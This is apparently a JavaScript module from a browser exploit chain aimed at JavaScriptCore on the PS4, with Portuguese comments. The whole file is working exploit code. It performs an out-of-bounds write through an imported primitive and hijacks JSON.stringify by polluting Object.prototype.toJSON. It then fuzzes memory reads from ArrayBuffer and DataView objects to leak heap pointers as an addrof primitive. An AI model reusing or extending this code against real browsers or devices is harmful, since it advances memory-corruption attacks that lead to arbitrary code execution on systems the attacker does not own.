// js/script3/testArrayBufferVictimCrash.mjs (v64_CorrectedV63_FuzzFlow)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V64_CFRF = "OriginalHeisenbug_TypedArrayAddrof_v64_CorrectedV63_FuzzFlow";

// Variáveis globais ao módulo para captura de dados pela sonda
let captured_fuzz_reads_for_AB_v64 = null;
let captured_fuzz_reads_for_DV_v64 = null;

let leak_target_buffer_v64 = null;
let leak_target_dataview_v64 = null;
let victim_typed_array_ref_v64 = null;
let probe_call_count_v64 = 0;
let all_probe_interaction_details_v64 = [];
let first_call_details_object_ref_v64 = null;

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const PROBE_CALL_LIMIT_V64 = 10;
const FUZZ_OFFSETS_V64 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50];

function toJSON_TA_Probe_CorrectedV63_FuzzFlow_v64() {
    probe_call_count_v64++;
    const call_num = probe_call_count_v64;
    let current_call_details = { // Objeto local para esta chamada da sonda
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V64_CFRF,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v64),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v64 && first_call_details_object_ref_v64 !== null),
        this_is_leak_target_AB: (this === leak_target_buffer_v64 && leak_target_buffer_v64 !== null),
        this_is_leak_target_DV: (this === leak_target_dataview_v64 && leak_target_dataview_v64 !== null),
        fuzz_capture_status: null,
        error_in_probe: null
    };
    // Log inicial da chamada da sonda
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1_details_obj}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V64) {
            all_probe_interaction_details_v64.push({...current_call_details});
            return { recursion_stopped_v64: true, call: call_num };
        }

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating C1_details WITH PAYLOADS.`, "info");
            first_call_details_object_ref_v64 = current_call_details; // C1_details É current_call_details desta chamada
            if (leak_target_buffer_v64) current_call_details.payload_AB = leak_target_buffer_v64;
            if (leak_target_dataview_v64) current_call_details.payload_DV = leak_target_dataview_v64;
            all_probe_interaction_details_v64.push({...current_call_details}); // Salva cópia dos detalhes desta chamada
            return current_call_details; // ****** CORREÇÃO CRÍTICA APLICADA: Retornar C1_details *****
        }
        // Caso 2: 'this' é o ArrayBuffer que injetamos no C1_details.payload_AB
        else if (current_call_details.this_is_leak_target_AB && current_call_details.this_type === '[object ArrayBuffer]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET ArrayBuffer! Fuzzing and capturing to side-channel...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = new DataView(this); // 'this' é o ArrayBuffer
                for (const offset of FUZZ_OFFSETS_V64) {
                    let low = 0, high = 0, ptr_str = "N/A", dbl = NaN, err_msg = null;
                    if (view.byteLength < (offset + 8)) { err_msg = "OOB"; fuzzed_reads.push({ offset: toHex(offset), error: err_msg }); }
                    else {
                        low = view.getUint32(offset, true); high = view.getUint32(offset + 4, true);
                        let ptr = new AdvancedInt64(low, high); ptr_str = ptr.toString(true);
                        let tb = new ArrayBuffer(8); (new Uint32Array(tb))[0]=low; (new Uint32Array(tb))[1]=high;
                        dbl = (new Float64Array(tb))[0];
                        fuzzed_reads.push({ offset: toHex(offset), low:toHex(low), high:toHex(high), int64:ptr_str, dbl:dbl });
                    }
                    logS3(`    AB Fuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg ? ' E:'+err_msg : ''}`, "dev_verbose"); // LOG INDIVIDUAL
                }
                captured_fuzz_reads_for_AB_v64 = fuzzed_reads;
                current_call_details.fuzz_capture_status = `AB Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
                all_probe_interaction_details_v64.push({...current_call_details});
                return { marker_ab_fuzz_done_v64: true, call_num_processed: call_num }; // Retorno simples
            } catch (e) { current_call_details.error_in_probe = e.message; all_probe_interaction_details_v64.push({...current_call_details}); return { error_marker_v64: `AB_Fuzz_${call_num}`, error_msg: e.message };}
        }
        // Caso 3: 'this' é o DataView que injetamos no C1_details.payload_DV
        else if (current_call_details.this_is_leak_target_DV && current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET DataView! Fuzzing and capturing to side-channel...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = this; // 'this' é o DataView
                for (const offset of FUZZ_OFFSETS_V64) {
                     let low = 0, high = 0, ptr_str = "N/A", dbl = NaN, err_msg = null;
                    if (view.byteLength < (offset + 8)) { err_msg = "OOB"; fuzzed_reads.push({ offset: toHex(offset), error: err_msg }); }
                    else {
                        low = view.getUint32(offset, true); high = view.getUint32(offset + 4, true);
                        let ptr = new AdvancedInt64(low, high); ptr_str = ptr.toString(true);
                        let tb = new ArrayBuffer(8); (new Uint32Array(tb))[0]=low; (new Uint32Array(tb))[1]=high;
                        dbl = (new Float64Array(tb))[0];
                        fuzzed_reads.push({ offset: toHex(offset), low:toHex(low), high:toHex(high), int64:ptr_str, dbl:dbl });
                    }
                    logS3(`    DV Fuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg ? ' E:'+err_msg : ''}`, "dev_verbose"); // LOG INDIVIDUAL
                }
                captured_fuzz_reads_for_DV_v64 = fuzzed_reads;
                current_call_details.fuzz_capture_status = `DV Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
                all_probe_interaction_details_v64.push({...current_call_details});
                return { marker_dv_fuzz_done_v64: true, call_num_processed: call_num }; // Retorno simples
            } catch (e) { current_call_details.error_in_probe = e.message; all_probe_interaction_details_v64.push({...current_call_details}); return { error_marker_v64: `DV_Fuzz_${call_num}`, error_msg: e.message };}
        }
        // Caso 4: 'this' é o C1_details (se for re-visitado por algum motivo)
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is C1_details_obj (re-entry or unexpected). Not modifying further.`, "warn");
            // Importante: Se C1_details for re-visitado, queremos que ele seja serializado como está (já com payloads)
            // para que JSON.stringify continue para os payloads.
            all_probe_interaction_details_v64.push({...current_call_details});
            return this;
        }
        // Caso 5: Outros tipos
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected: ${current_call_details.this_type}. Returning simple marker.`, "warn");
            all_probe_interaction_details_v64.push({...current_call_details});
            // Retorno simples para evitar re-entrância complexa
            return `ProcessedCall${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;
        }
    } catch (e_probe) {
        current_call_details.error_in_probe = e_probe.message;
        const FNAME_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V64_CFRF;
        logS3(`[${FNAME_REF}] Probe Call #${call_num}: CRIT ERR: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_REF);
        all_probe_interaction_details_v64.push({...current_call_details});
        return { error_marker_v64: call_num, error_msg: e_probe.message };
    }
}

export async function executeTypedArrayVictimAddrofTest_CorrectedV63_FuzzFlow() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V64_CFRF}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (CorrectedV63_FuzzFlow) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V64_CFRF} Init...`;

    // Resetar variáveis de captura e estado a cada execução
    captured_fuzz_reads_for_AB_v64 = null;
    captured_fuzz_reads_for_DV_v64 = null;
    probe_call_count_v64 = 0;
    all_probe_interaction_details_v64 = [];
    victim_typed_array_ref_v64 = null;
    first_call_details_object_ref_v64 = null;

    leak_target_buffer_v64 = new ArrayBuffer(0x80);
    leak_target_dataview_v64 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A";
    let stringifyOutput_parsed = null;
    let collected_probe_details_for_return = []; // Para o bug do runner

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v64)" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v64)" };

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        victim_typed_array_ref_v64 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_CorrectedV63_FuzzFlow_v64, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v64)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v64);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); }
            catch (e) { stringifyOutput_parsed = {error_parsing_stringify: e.message, raw: rawStringifyOutput}; }

            logS3("STEP 3: Analyzing fuzz data captured in side-channels (v64)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false; // True se TypedArray alvo se tornou 'this' OU C1 foi populado

            const process_captured_fuzz_reads = (fuzzed_reads_array, target_addrof_result, objTypeName) => {
                if (fuzzed_reads_array && Array.isArray(fuzzed_reads_array)) {
                    // A indicação de heisenbug (TypedArray se tornou 'this') é confirmada pela existência do array.
                    heisenbugIndication = true;
                    logS3(`  V64_ANALYSIS: Processing ${fuzzed_reads_array.length} captured fuzz reads for ${objTypeName}.`, "good");
                    // Os logs detalhados de CADA leitura já foram feitos pela sonda.
                    for (const read_attempt of fuzzed_reads_array) {
                        if (read_attempt.error) {
                            // LogS3 `    Offset ${read_attempt.offset}: Error - ${read_attempt.error}` já feito na sonda
                            continue;
                        }
                        const highVal = parseInt(read_attempt.high, 16);
                        const lowVal = parseInt(read_attempt.low, 16);

                        let isPotentialPtr = false;
                        // Checagem de JSValue Cell Pointer (requer JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH etc. definidos)
                        if (JSC_OFFSETS.JSValue && JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH !== undefined &&
                            JSC_OFFSETS.JSValue.TAG_MASK !== undefined && JSC_OFFSETS.JSValue.CELL_TAG !== undefined) {
                           isPotentialPtr = (highVal === JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH && (lowVal & JSC_OFFSETS.JSValue.TAG_MASK) === JSC_OFFSETS.JSValue.CELL_TAG);
                        }
                        // Checagem de range genérico de heap (ajustar limites para o heap do PS4 JSC)
                        // Exemplo: não nulo, não muito pequeno, alinhado em 8 bytes, e dentro de um range amplo.
                        if (!isPotentialPtr && (highVal > 0 || lowVal > 0x10000) && // Não nulo ou muito pequeno
                            (highVal < 0x000F0000) && // Limite superior (exemplo, ajustar!)
                            ((lowVal & 0x7) === 0) ) { // Alinhamento de 8 bytes
                            isPotentialPtr = true;
                        }

                        if (isPotentialPtr && !(highVal === 0 && lowVal === 0) ) {
                            target_addrof_result.success = true;
                            target_addrof_result.msg = `V64 SUCCESS (${objTypeName} Fuzz Read): Potential Ptr ${read_attempt.int64} from offset ${read_attempt.offset}`;
                            logS3(`  !!!! V64 POTENTIAL POINTER FOUND for ${objTypeName} at offset ${read_attempt.offset}: ${read_attempt.int64} !!!!`, "vuln");
                            break; // Para no primeiro ponteiro encontrado para este objeto
                        }
                    }
                    if (!target_addrof_result.success) {
                        target_addrof_result.msg = `V64 Fuzzed reads for ${objTypeName} (side-channel) did not yield pointer. First read: ${fuzzed_reads_array[0]?.int64 || 'N/A (or OOB)'}`;
                    }
                } else if (!target_addrof_result.success) { // Só atualiza msg se ainda não houve sucesso
                     target_addrof_result.msg = `V64 No fuzz data in side-channel for ${objTypeName}.`;
                }
            };

            process_captured_fuzz_reads(captured_fuzz_reads_for_AB_v64, addrof_A_result, "ArrayBuffer");
            process_captured_fuzz_reads(captured_fuzz_reads_for_DV_v64, addrof_B_result, "DataView");

            // Confirmação secundária de heisenbug se C1 foi populado, mesmo que fuzz não tenha dado certo
            if (!heisenbugIndication && first_call_details_object_ref_v64) {
                const c1 = first_call_details_object_ref_v64;
                if (c1.payload_AB === leak_target_buffer_v64 || c1.payload_DV === leak_target_dataview_v64) {
                    heisenbugIndication = true; // C1 foi populado
                     logS3(`  V64_ANALYSIS: C1_details was populated. Target TypedArray may not have become 'this', or fuzz data issue.`, "info");
                }
            }

            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V64_CFRF}: Addr SUCCESS!`;
            } else if (heisenbugIndication) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V64_CFRF}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V64_CFRF}: No Heisenbug?`;
            }
        } catch (e_str_outer) { errorCapturedMain = e_str_outer; /* ... */ }
        finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_overall_main) { errorCapturedMain = e_overall_main; /* ... */ }
    finally {
        // Copiar all_probe_interaction_details_v64 ANTES de limpar para o runner
        collected_probe_details_for_return = all_probe_interaction_details_v64.map(d => ({...d})); // Cópia para evitar problemas
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v64}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v64 = null;
        all_probe_interaction_details_v64 = [];
        probe_call_count_v64 = 0;
        first_call_details_object_ref_v64 = null;
        leak_target_buffer_v64 = null;
        leak_target_dataview_v64 = null;
        captured_fuzz_reads_for_AB_v64 = null;
        captured_fuzz_reads_for_DV_v64 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        stringifyResult: stringifyOutput_parsed,
        rawStringifyForAnalysis: rawStringifyOutput,
        all_probe_calls_for_analysis: collected_probe_details_for_return,
        total_probe_calls: probe_call_count_v64,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
};
